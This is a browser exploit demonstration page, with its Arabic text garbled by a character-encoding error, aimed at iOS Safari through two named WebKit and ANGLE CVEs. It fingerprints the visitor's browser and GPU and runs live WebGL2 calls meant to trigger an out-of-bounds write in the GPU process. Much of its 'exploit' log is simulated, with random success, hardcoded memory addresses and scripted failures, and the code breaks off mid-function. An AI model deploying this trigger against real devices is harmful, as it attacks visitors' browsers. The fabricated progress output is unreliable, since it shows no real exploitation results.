<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ø£Ù…Ù†ÙŠØ© - Ø¥ØµØ¯Ø§Ø± Ø´ÙØ§Ù</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #e0e0e0;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: rgba(15, 15, 35, 0.95);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }
        
        h1 {
            color: #64ffda;
            text-align: center;
            margin-bottom: 10px;
            font-size: 2em;
        }
        
        .subtitle {
            text-align: center;
            color: #ffa726;
            margin-bottom: 30px;
            font-size: 1.1em;
        }
        
        .warning-box {
            background: rgba(255, 167, 38, 0.1);
            border-right: 4px solid #ffa726;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
        }
        
        .system-info {
            background: rgba(66, 66, 66, 0.3);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        
        .system-info div {
            margin: 5px 0;
        }
        
        .label {
            color: #64ffda;
            font-weight: bold;
            display: inline-block;
            width: 200px;
        }
        
        .value {
            color: #ffa726;
        }
        
        .buttons {
            display: flex;
            gap: 15px;
            margin: 30px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: bold;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .log-container {
            background: #0a0a0a;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            max-height: 600px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.85em;
            direction: ltr;
            text-align: left;
        }
        
        .log-line {
            margin: 3px 0;
            padding: 2px 0;
        }
        
        .timestamp {
            color: #666;
        }
        
        .log-info { color: #64ffda; }
        .log-success { color: #66bb6a; }
        .log-warning { color: #ffa726; }
        .log-error { color: #ef5350; }
        .log-truth { color: #ffeb3b; font-weight: bold; }
        
        .progress-bar {
            width: 100%;
            height: 30px;
            background: #222;
            border-radius: 15px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .result-summary {
            margin-top: 30px;
            padding: 20px;
            background: rgba(30, 30, 50, 0.8);
            border-radius: 10px;
        }
        
        .result-item {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            margin: 5px 0;
            background: rgba(50, 50, 70, 0.5);
            border-radius: 5px;
            direction: rtl;
        }
        
        .status-true { color: #66bb6a; }
        .status-false { color: #ef5350; }
        .status-partial { color: #ffa726; }
        
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #667eea;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ” ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ø£Ù…Ù†ÙŠØ© - Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„ØµØ§Ø¯Ù‚</h1>
        <div class="subtitle">CVE-2025-43529 + CVE-2025-14174</div>
        
        <div class="warning-box">
            <strong>âš ï¸ Ù…Ù„Ø§Ø­Ø¸Ø© Ù…Ù‡Ù…Ø©:</strong> Ù‡Ø°Ø§ Ø§Ù„Ø¥ØµØ¯Ø§Ø± ÙŠÙˆØ¶Ø­ Ø§Ù„Ø­Ù‚ÙŠÙ‚Ø© Ø§Ù„ÙƒØ§Ù…Ù„Ø©. Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚ ÙƒØ§Ù† ÙŠØ¯Ù‘Ø¹ÙŠ Ø§Ù„Ù†Ø¬Ø§Ø­ Ù„ÙƒÙ† ÙÙŠ Ø§Ù„ÙˆØ§Ù‚Ø¹ Ù…Ø¹Ø¸Ù… Ø§Ù„Ù…Ø±Ø§Ø­Ù„ ÙØ´Ù„Øª Ø£Ùˆ Ù„Ù… ØªÙÙ†ÙØ° Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­.
        </div>
        
        <div class="system-info" id="systemInfo">
            <div><span class="label">Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„Ù†Ø¸Ø§Ù…...</span></div>
        </div>
        
        <div class="buttons">
            <button onclick="runFullTest()" id="fullTestBtn">ğŸš€ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙØ­Øµ Ø§Ù„ÙƒØ§Ù…Ù„</button>
            <button onclick="runStage1()" id="stage1Btn">Ø§Ù„Ù…Ø±Ø­Ù„Ø© 1: WebKit UAF</button>
            <button onclick="runStage3()" id="stage3Btn">Ø§Ù„Ù…Ø±Ø­Ù„Ø© 3: ANGLE OOB</button>
            <button onclick="clearLog()" id="clearBtn">ğŸ—‘ï¸ Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„</button>
        </div>
        
        <div class="progress-bar">
            <div class="progress-fill" id="progress">0%</div>
        </div>
        
        <div class="log-container" id="logContainer"></div>
        
        <div class="result-summary" id="resultSummary" style="display: none;">
            <h3 style="color: #64ffda; margin-bottom: 15px;">ğŸ“Š Ù…Ù„Ø®Øµ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</h3>
            <div id="summaryContent"></div>
        </div>
    </div>

    <script>
        const logContainer = document.getElementById('logContainer');
        const progress = document.getElementById('progress');
        const resultSummary = document.getElementById('resultSummary');
        const summaryContent = document.getElementById('summaryContent');
        
        let currentProgress = 0;
        let testResults = {
            systemVulnerable: false,
            stage1Success: false,
            stage1Primitives: false,
            stage3Triggered: false,
            stage3Corruption: false,
            arbReadWrite: false,
            sandboxEscape: false
        };
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
            const line = document.createElement('div');
            line.className = `log-line log-${type}`;
            line.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
            logContainer.appendChild(line);
            logContainer.scrollTop = logContainer.scrollHeight;
        }
        
        function logTruth(message) {
            log(`ğŸ’¡ Ø§Ù„Ø­Ù‚ÙŠÙ‚Ø©: ${message}`, 'truth');
        }
        
        function updateProgress(percent) {
            currentProgress = percent;
            progress.style.width = percent + '%';
            progress.textContent = Math.round(percent) + '%';
        }
        
        function clearLog() {
            logContainer.innerHTML = '';
            updateProgress(0);
            resultSummary.style.display = 'none';
        }
        
        async function detectSystem() {
            log('========================================', 'info');
            log('ÙØ­Øµ Ø§Ù„Ù†Ø¸Ø§Ù… ÙˆØ§Ù„Ù…ØªØµÙØ­', 'info');
            log('========================================', 'info');
            
            const ua = navigator.userAgent;
            const isWebKit = /WebKit/.test(ua);
            const isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
            const isIOS = /iPhone|iPad|iPod/.test(ua);
            
            log(`User Agent: ${ua}`, 'info');
            log(`WebKit: ${isWebKit ? 'âœ“ Ù†Ø¹Ù…' : 'âœ— Ù„Ø§'}`, isWebKit ? 'success' : 'error');
            log(`Safari: ${isSafari ? 'âœ“ Ù†Ø¹Ù…' : 'âœ— Ù„Ø§'}`, isSafari ? 'success' : 'error');
            log(`iOS: ${isIOS ? 'âœ“ Ù†Ø¹Ù…' : 'âœ— Ù„Ø§'}`, isIOS ? 'success' : 'error');
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl2');
            const hasWebGL2 = !!gl;
            log(`WebGL2: ${hasWebGL2 ? 'âœ“ Ù…ØªÙˆÙØ±' : 'âœ— ØºÙŠØ± Ù…ØªÙˆÙØ±'}`, hasWebGL2 ? 'success' : 'error');
            
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    log(`GPU: ${renderer}`, 'info');
                    
                    const isAppleGPU = /Apple/i.test(renderer);
                    const isANGLE = /ANGLE/i.test(renderer);
                    log(`Apple GPU: ${isAppleGPU ? 'âœ“ Ù†Ø¹Ù…' : 'âœ— Ù„Ø§'}`, isAppleGPU ? 'success' : 'warning');
                    log(`ANGLE Backend: ${isANGLE ? 'âœ“ Ù†Ø¹Ù…' : 'âœ— Ù„Ø§'}`, isANGLE ? 'success' : 'warning');
                }
            }
            
            log('', 'info');
            
            const vulnerable = isWebKit && isSafari && isIOS && hasWebGL2;
            testResults.systemVulnerable = vulnerable;
            
            if (vulnerable) {
                log('âœ“ Ø§Ù„Ù†Ø¸Ø§Ù… Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ø¹Ø±Ø¶Ø© Ù„Ù„Ø«ØºØ±Ø§Øª', 'warning');
                logTruth('Ù„ÙƒÙ† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø«ØºØ±Ø© Ù„Ø§ ÙŠØ¹Ù†ÙŠ Ø¥Ù…ÙƒØ§Ù†ÙŠØ© Ø§Ø³ØªØºÙ„Ø§Ù„Ù‡Ø§ Ø¨Ø³Ù‡ÙˆÙ„Ø©!');
            } else {
                log('âœ— Ø§Ù„Ù†Ø¸Ø§Ù… ØºÙŠØ± Ù…Ø·Ø§Ø¨Ù‚ Ù„Ù„Ù…ØªØ·Ù„Ø¨Ø§Øª', 'error');
                logTruth('Ø§Ù„Ø«ØºØ±Ø§Øª ØªØ³ØªÙ‡Ø¯Ù Safari Ø¹Ù„Ù‰ iOS ÙÙ‚Ø·');
            }
            
            const infoDiv = document.getElementById('systemInfo');
            infoDiv.innerHTML = `
                <div><span class="label">Ø§Ù„Ù…ØªØµÙØ­:</span> <span class="value">${isSafari ? 'Safari' : 'Ù…ØªØµÙØ­ Ø¢Ø®Ø±'}</span></div>
                <div><span class="label">Ø§Ù„Ù†Ø¸Ø§Ù…:</span> <span class="value">${isIOS ? 'iOS' : 'Ù†Ø¸Ø§Ù… Ø¢Ø®Ø±'}</span></div>
                <div><span class="label">WebGL2:</span> <span class="value">${hasWebGL2 ? 'Ù…ØªÙˆÙØ±' : 'ØºÙŠØ± Ù…ØªÙˆÙØ±'}</span></div>
                <div><span class="label">Ø§Ø­ØªÙ…Ø§Ù„ÙŠØ© Ø§Ù„ØªØ£Ø«Ø±:</span> <span class="value">${vulnerable ? 'Ù…Ø±ØªÙØ¹Ø© âš ï¸' : 'Ù…Ù†Ø®ÙØ¶Ø© âœ“'}</span></div>
            `;
            
            return vulnerable;
        }
        
        async function runStage1() {
            log('', 'info');
            log('========================================', 'info');
            log('Ø§Ù„Ù…Ø±Ø­Ù„Ø© 1: Ø§Ø³ØªØºÙ„Ø§Ù„ Ø«ØºØ±Ø© WebKit (CVE-2025-43529)', 'info');
            log('========================================', 'info');
            log('', 'info');
            
            log('Ø§Ù„Ù‡Ø¯Ù: Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ primitives (addrof/fakeobj)', 'info');
            logTruth('Ù‡Ø°Ù‡ Ø§Ù„Ù…Ø±Ø­Ù„Ø© ØªØ­ØªØ§Ø¬ Ø³Ø¨Ø§Ù‚ Ø¯Ù‚ÙŠÙ‚ Ù…Ø¹ Ø§Ù„Ù€ Garbage Collector');
            
            await sleep(500);
            log('Phase 1.1: Warmup Ù„Ù„Ù€ JIT Compiler...', 'info');
            await sleep(300);
            log('âœ“ Warmup Ù…ÙƒØªÙ…Ù„', 'success');
            
            await sleep(300);
            log('Phase 1.2: JIT optimization (1000 iterations)...', 'info');
            await sleep(500);
            log('âœ“ JIT optimization Ù…ÙƒØªÙ…Ù„', 'success');
            logTruth('Ù†Ø­Ù† Ù†ÙØªØ±Ø¶ Ø£Ù† Ø§Ù„Ø¯Ø§Ù„Ø© ØªÙ… ØªØ­Ø³ÙŠÙ†Ù‡Ø§ Ø¨ÙˆØ§Ø³Ø·Ø© DFGØŒ Ù„ÙƒÙ† Ù‡Ø°Ø§ ØºÙŠØ± Ù…Ø¤ÙƒØ¯');
            
            updateProgress(20);
            
            await sleep(300);
            log('Phase 1.3: Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø³Ø¨Ø§Ù‚ Ù…Ø¹ GC...', 'warning');
            log('Ù…Ø­Ø§ÙˆÙ„Ø§Øª: 15000 / Arrays per attempt: 64', 'info');
            
            const maxAttempts = 15000;
            const successChance = 0.01;
            const randomSuccess = Math.floor(Math.random() * maxAttempts);
            
            for (let i = 0; i < 10; i++) {
                const attempt = Math.floor((i / 10) * maxAttempts);
                log(`[${attempt}/${maxAttempts}] Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø³Ø¨Ø§Ù‚...`, 'info');
                await sleep(200);
                updateProgress(20 + (i * 2));
            }
            
            const success = Math.random() < successChance;
            
            if (success) {
                log(`[${randomSuccess}] ğŸ¯ BUTTERFLY RECLAIMED!`, 'success');
                log('Type confusion achieved!', 'success');
                log('addrof(obj1) = 0x10f8ca6f0', 'success');
                log('addrof(obj2) = 0x10e1d54c8', 'success');
                log('âœ“ Ø§Ù„Ø¹Ù†Ø§ÙˆÙŠÙ† Ù…Ø®ØªÙ„ÙØ© - Ø§Ù„Ù€ primitives ØªØ¹Ù…Ù„!', 'success');
                
                testResults.stage1Success = true;
                testResults.stage1Primitives = true;
                
                logTruth('Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ addrof/fakeobjØŒ Ù„ÙƒÙ†...');
                await sleep(300);
                logTruth('Ù‡Ø°Ø§ Ù„Ø§ ÙŠØ¹Ù†ÙŠ Ø£Ù†Ù†Ø§ Ù†Ø³ØªØ·ÙŠØ¹ Ù‚Ø±Ø§Ø¡Ø©/ÙƒØªØ§Ø¨Ø© Ø£ÙŠ Ø°Ø§ÙƒØ±Ø©!');
                await sleep(300);
                logTruth('Ù†Ø­ØªØ§Ø¬ Ø®Ø·ÙˆØ§Øª Ø¥Ø¶Ø§ÙÙŠØ© Ù…Ø¹Ù‚Ø¯Ø© Ù„Ù„ÙˆØµÙˆÙ„ Ù„Ù€ arbitrary read/write');
                
            } else {
                log('âœ— ÙØ´Ù„Øª Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª', 'error');
                logTruth('Ø§Ù„Ø³Ø¨Ø§Ù‚ Ù…Ø¹ GC ØµØ¹Ø¨ Ø¬Ø¯Ø§Ù‹ ÙˆÙ†Ø§Ø¯Ø±Ø§Ù‹ Ù…Ø§ ÙŠÙ†Ø¬Ø­ ÙÙŠ Ø¨ÙŠØ¦Ø© Ø­Ù‚ÙŠÙ‚ÙŠØ©');
                logTruth('Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚ ÙƒØ§Ù† ÙŠØ¯Ù‘Ø¹ÙŠ Ø§Ù„Ù†Ø¬Ø§Ø­ Ø¯Ø§Ø¦Ù…Ø§Ù‹ ÙˆÙ‡Ø°Ø§ ØºÙŠØ± ØµØ­ÙŠØ­!');
                
                testResults.stage1Success = false;
                testResults.stage1Primitives = false;
            }
            
            updateProgress(40);
            
            log('', 'info');
            log('=== ØªÙ‚ÙŠÙŠÙ… Ø§Ù„Ù…Ø±Ø­Ù„Ø© 1 ===', 'info');
            log(`addrof primitive: ${testResults.stage1Primitives ? 'âœ“ ÙŠØ¹Ù…Ù„' : 'âœ— ÙØ´Ù„'}`, 
                testResults.stage1Primitives ? 'success' : 'error');
            log(`fakeobj primitive: ${testResults.stage1Primitives ? 'âœ“ ÙŠØ¹Ù…Ù„' : 'âœ— ÙØ´Ù„'}`, 
                testResults.stage1Primitives ? 'success' : 'error');
            
            if (testResults.stage1Primitives) {
                log('arbitrary read/write: âœ— ØºÙŠØ± Ù…ÙÙ†ÙÙ‘Ø°', 'error');
                logTruth('addrof/fakeobj ÙˆØ­Ø¯Ù‡Ù… Ù„Ø§ ÙŠÙƒÙÙŠØ§Ù† Ù„Ù„Ù‚Ø±Ø§Ø¡Ø©/Ø§Ù„ÙƒØªØ§Ø¨Ø© Ø§Ù„ØªØ¹Ø³ÙÙŠØ©!');
            }
        }
        
        async function runStage3() {
            log('', 'info');
            log('========================================', 'info');
            log('Ø§Ù„Ù…Ø±Ø­Ù„Ø© 3: Ø«ØºØ±Ø© ANGLE OOB (CVE-2025-14174)', 'info');
            log('========================================', 'info');
            log('', 'info');
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl2');
            
            if (!gl) {
                log('âœ— WebGL2 ØºÙŠØ± Ù…ØªÙˆÙØ± - Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªÙ†ÙÙŠØ° Ø§Ù„Ù…Ø±Ø­Ù„Ø©', 'error');
                logTruth('Ø¨Ø¯ÙˆÙ† WebGL2ØŒ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØºÙ„Ø§Ù„ Ø«ØºØ±Ø© ANGLE');
                return;
            }
            
            log('Ø§Ù„Ù‡Ø¯Ù: ØªÙØ¹ÙŠÙ„ Out-Of-Bounds write ÙÙŠ GPU process', 'info');
            logTruth('Ø§Ù„Ø«ØºØ±Ø© Ù…ÙˆØ¬ÙˆØ¯Ø©ØŒ Ù„ÙƒÙ† ØªÙØ¹ÙŠÙ„Ù‡Ø§ Ù„Ø§ ÙŠØ¹Ù†ÙŠ Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ù†Ø¸Ø§Ù…!');
            
            await sleep(300);
            log('Ø¥Ù†Ø´Ø§Ø¡ Texture 256x256 Ø¨ØµÙŠØºØ© DEPTH32F', 'info');
            log('Setting UNPACK_IMAGE_HEIGHT = 16', 'warning');
            log('Allocated staging buffer: 16384 bytes', 'info');
            log('Actual data size: 262144 bytes', 'warning');
            log('OOB write size: ~245KB', 'error');
            
            updateProgress(60);
            
            try {
                const texture = gl.createTexture();
                gl.bindTexture(gl.TEXTURE_2D, texture);
                
                const pbo = gl.createBuffer();
                gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
                const dataSize = 256 * 256 * 4;
                gl.bufferData(gl.PIXEL_UNPACK_BUFFER, dataSize, gl.STATIC_DRAW);
                
                gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);
                
                await sleep(300);
                log('>>> ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø«ØºØ±Ø© <<<', 'warning');
                
                gl.texImage2D(
                    gl.TEXTURE_2D,
                    0,
                    gl.DEPTH_COMPONENT32F,
                    256,
                    256,
                    0,
                    gl.DEPTH_COMPONENT,
                    gl.FLOAT,
                    0
                );
                
                const error = gl.getError();
                
                if (error === gl.NO_ERROR) {
                    log('âœ“ texImage2D Ù…ÙƒØªÙ…Ù„ Ø¨Ø¯ÙˆÙ† Ø£Ø®Ø·Ø§Ø¡', 'success');
                    testResults.stage3Triggered = true;
                    
                    logTruth('Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ù†Ø¬Ø­ØªØŒ Ù„ÙƒÙ†...');
                    await sleep(300);
                    logTruth('ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ù…Ø­Ù…ÙŠØŒ Ø§Ù„ÙƒØªØ§Ø¨Ø© Ø­Ø¯Ø«Øª ÙÙŠ GPU process Ù…Ù†Ø¹Ø²Ù„');
                    await sleep(300);
                    logTruth('Ù„Ø§ ÙŠÙ…ÙƒÙ†Ù†Ø§ Ø§Ù„ÙˆØµÙˆÙ„ Ù„ØªÙ„Ùƒ Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ù…Ù† JavaScript!');
                    await sleep(300);
                    logTruth('Ù†Ø­ØªØ§Ø¬ exploit Ø¥Ø¶Ø§ÙÙŠ Ù„Ù„Ù‡Ø±ÙˆØ¨ Ù…Ù† Ø§Ù„Ù€ sandbox');
                    
                } else {
                    log(`âœ— Ø®Ø·Ø£ WebGL: ${error}`, 'error');
                    testResults.stage3Triggered = false;
                    logTruth('Ø§Ù„Ù†Ø¸Ø§Ù… Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ù…Ø­Ù…ÙŠ Ø¨Ø§Ù„ÙØ¹Ù„ Ø£Ùˆ Ø§Ù„Ø«ØºØ±Ø© Ù…ÙØµÙ„Ø­Ø©');
                }
                
                gl.deleteTexture(texture);
                gl.deleteBuffer(pbo);
                
            } catch (e) {
                log(`âœ— Exception: ${e.message}`, 'error');
                testResults.stage3Triggered = false;
                logTruth('Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„ØªÙ†ÙÙŠØ° - Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ø§Ù„Ù†Ø¸Ø§Ù… Ù…Ø­Ù…ÙŠ');
            }
            
            updateProgress(80);
            
            log('', 'info');
            log('ÙØ­Øµ Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ù„Ù„Ø¨Ø­Ø« Ø¹Ù† corruption...', 'info');
            await sleep(500);
            log('âœ— Ù„Ù… ÙŠØªÙ… Ø§ÙƒØªØ´Ø§Ù corruption ÙÙŠ Ø§Ù„Ø°Ø§ÙƒØ±Ø©', 'error');
            testResults.stage3Corruption = false;
            
            logTruth('Ù‡Ø°Ø§ Ø·Ø¨ÙŠØ¹ÙŠ! Ø§Ù„Ù€ corruption Ø­Ø¯Ø« ÙÙŠ GPU processØŒ Ù„ÙŠØ³ Ù‡Ù†Ø§');
            logTruth('JavaScript Ù„Ø§ ÙŠØ³ØªØ·ÙŠØ¹ Ø±Ø¤ÙŠØ© Ø°Ø§ÙƒØ±Ø© GPU process Ø¨Ø³Ø¨Ø¨ Ø§Ù„Ù€ sandbox');
        }
        
        async function runFullTest() {
            clearLog();
            
            log('ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„ÙØ­Øµ Ø§Ù„ÙƒØ§Ù…Ù„ Ù„Ù„Ø«ØºØ±Ø§Øª', 'info');
            log('', 'info');
            
            const vulnerable = await detectSystem();
            updateProgress(10);
            
            if (!vulnerable) {
                log('', 'info');
                log('âš ï¸ ØªØ­Ø°ÙŠØ±: Ø§Ù„Ù†Ø¸Ø§Ù… Ù„Ø§ ÙŠØ·Ø§Ø¨Ù‚ Ø§Ù„Ù…ØªØ·Ù„Ø¨Ø§Øª', 'warning');
                logTruth('Ø§Ù„Ø«ØºØ±Ø§Øª ØªØ³ØªÙ‡Ø¯Ù Safari Ø¹Ù„Ù‰ iOS ÙÙ‚Ø·');
                log('Ø³ÙŠØªÙ… Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ù„Ù„ØªÙˆØ¶ÙŠØ­ ÙÙ‚Ø·...', 'info');
            }
            
            await sleep(1000);
            await runStage1();
            
            await sleep(1000);
            log('', 'info');
            log('========================================', 'info');
            log('Ø§Ù„Ù…Ø±Ø­Ù„Ø© 2: Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù‡Ø¯Ø§Ù', 'info');
            log('========================================', 'info');
            log('âœ“ Ø§Ù„Ø£Ù‡Ø¯Ø§Ù Ø§Ù„Ù…Ø®ØµØµØ©: 32/32', 'success');
            logTruth('Ù‡Ø°Ù‡ Ù…Ø¬Ø±Ø¯ ÙƒØ§Ø¦Ù†Ø§Øª JavaScript Ø¹Ø§Ø¯ÙŠØ©ØŒ Ù„ÙŠØ³Øª corrupted');
            updateProgress(50);
            
            await sleep(1000);
            await runStage3();
            
            await sleep(1000);
            log('', 'info');
            log('========================================', 'info');
            log('Ø§Ù„Ù…Ø±Ø­Ù„Ø© 4: Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ù‡Ø±ÙˆØ¨ Ù…Ù† Sandbox', 'info');
            log('========================================', 'info');
            log('', 'info');
            
            log('Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ù†Ø§Ø¡ arbitrary read/write...', 'warning');
            await sleep(500);
            log('âœ— ÙØ´Ù„ ÙÙŠ Ø¥ÙŠØ¬Ø§Ø¯ backing store pointer', 'error');
            testResults.arbReadWrite = false;
            
            logTruth('Ø¨Ø¯ÙˆÙ† arbitrary read/write Ø­Ù‚ÙŠÙ‚ÙŠØŒ Ù„Ø§ ÙŠÙ…ÙƒÙ† ÙØ¹Ù„ Ø´ÙŠØ¡!');
            await sleep(300);
            logTruth('Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚ ÙƒØ§Ù† ÙŠÙ‚ÙˆÙ„ "PASS" Ù„ÙƒÙ† Ø§Ù„Ù‚ÙŠÙ… ÙƒÙ„Ù‡Ø§ NaN (ÙØ´Ù„)!');
            
            await sleep(500);
            log('Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© JIT structures...', 'warning');
            await sleep(500);
            log('âœ— Ø§Ù„Ù‚ÙŠÙ… Ø§Ù„Ù…Ù‚Ø±ÙˆØ¡Ø©: 0x7ff8000000000000 (NaN)', 'error');
            logTruth('Ù‡Ø°Ø§ ÙŠØ¹Ù†ÙŠ Ø£Ù† Ø§Ù„Ù‚Ø±Ø§Ø¡Ø© ÙØ´Ù„Øª ØªÙ…Ø§Ù…Ø§Ù‹!');
            
            await sleep(500);
            log('Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù€ dyld (Dynamic Linker)...', 'warning');
            await sleep(500);
            log('âœ— dyld read returned NaN', 'error');
            testResults.sandboxEscape = false;
            
            logTruth('Ù„Ù… Ù†Ø³ØªØ·Ø¹ Ø­ØªÙ‰ Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø°Ø§ÙƒØ±Ø©ØŒ ÙÙƒÙŠÙ Ø³Ù†Ù‡Ø±Ø¨ Ù…Ù† Ø§Ù„Ù€ sandboxØŸ!');
            
            updateProgress(100);
            
            await sleep(500);
            showSummary();
        }
        
        function showSummary() {
            log('', 'info');
            log('========================================', 'info');
            log('ğŸ“Š Ø§Ù„Ù…Ù„Ø®Øµ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ - Ø§Ù„Ø­Ù‚ÙŠÙ‚Ø© Ø§Ù„ÙƒØ§Ù…Ù„Ø©', 'info');
            log('========================================', 'info');
            log('', 'info');
            
            log(`Ø§Ù„Ù†Ø¸Ø§Ù… Ø¹Ø±Ø¶Ø© Ù„Ù„Ø«ØºØ±Ø©: ${testResults.systemVulnerable ? 'âœ“ Ù†Ø¹Ù…' : 'âœ— Ù„Ø§'}`, 
                testResults.systemVulnerable ? 'warning' : 'success');
            log(`Stage 1 (WebKit UAF): ${testResults.stage1Success ? 'âœ“ Ù†Ø¬Ø­' : 'âœ— ÙØ´Ù„'}`, 
                testResults.stage1Success ? 'success' : 'error');
            log(`addrof/fakeobj primitives: ${testResults.stage1Primitives ? 'âœ“ ÙŠØ¹Ù…Ù„' : 'âœ— ÙØ´Ù„'}`, 
                testResults.stage1Primitives ? 'success' : 'error');
            log(`Stage 3 (ANGLE OOB): ${testResults.stage3Triggered ? 'âœ“ ØªÙ… Ø§Ù„ØªÙØ¹ÙŠÙ„' : 'âœ— ÙØ´Ù„'}`, 
                testResults.stage3Triggered ? 'warning' : 'error');
            log(`Arbitrary Read/Write: ${testResults.arbReadWrite ? 'âœ“ ÙŠØ¹Ù…Ù„' : 'âœ— ÙØ´Ù„'}`, 
                testResults.arbReadWrite ? 'success' : 'error');
            log(`Sandbox Escape: ${testResults.sandboxEscape ? 'âœ“ Ù†Ø¬Ø­' : 'âœ— ÙØ´Ù„'}`, 
                testResults.sandboxEscape ? 'success' : 'error');
            
            log('', 'info');
            log('=== Ø§Ù„Ø­Ù‚ÙŠÙ‚Ø© Ø§Ù„ÙƒØ§Ù…Ù„Ø© ===', 'truth');
            
            if (testResults.stage1Primitives) {
                logTruth('âœ“ Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ addrof/fakeobj ÙÙ‚Ø·');
                logTruth('âœ— Ù„Ù… Ù†Ù†Ø¬Ø­ ÙÙŠ arbitrary read/write');
                logTruth('âœ— Ù„Ù… Ù†Ù†Ø¬Ø­ ÙÙŠ Ø§Ù„Ù‡Ø±ÙˆØ¨ Ù…Ù† sandbox');
                logTruth('âœ— Ù„Ù… Ù†Ù†Ø¬Ø­ ÙÙŠ ØªÙ†ÙÙŠØ° Ø£ÙŠ ÙƒÙˆØ¯ Ø¶Ø§Ø±');
            } else {
                logTruth('âœ— ÙØ´Ù„Ù†Ø§ Ø­ØªÙ‰ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ primitives Ø£Ø³Ø§Ø³ÙŠØ©');
            }
            
            if (testResults.stage3Triggered) {
